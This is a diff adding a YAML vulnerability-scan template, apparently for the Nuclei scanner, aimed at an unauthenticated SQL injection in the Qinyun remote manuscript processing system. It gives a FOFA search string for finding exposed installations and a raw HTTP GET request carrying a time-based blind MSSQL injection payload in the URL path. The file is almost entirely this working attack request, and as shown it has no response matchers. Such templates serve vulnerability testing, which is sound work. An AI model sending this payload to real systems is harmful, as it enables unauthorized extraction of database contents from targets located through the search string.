@@ -1,0 +1,20 @@
+id: qinyun-remote-manuscript-sql
+
+info:
+  name: "勤云远程稿件处理系统Burpsuite接口SQL注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="北京勤云科技"
+      勤云远程稿件处理系统Burpsuite接口存在SQL注入漏洞，攻击者可构造恶意SQL查询在未认证状态下获取数据库敏感数据。
+  tags: 勤云远程稿件处理系统
+
+http:
+- raw:
+  - |-
+    GET /burpsuite'if%20db_name(1)='master'%20waitfor%20delay%20'0:0:5'--/article/abstract/1 HTTP/1.1
+    Host: {{Hostname}}
+    Connection: keep-alive
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
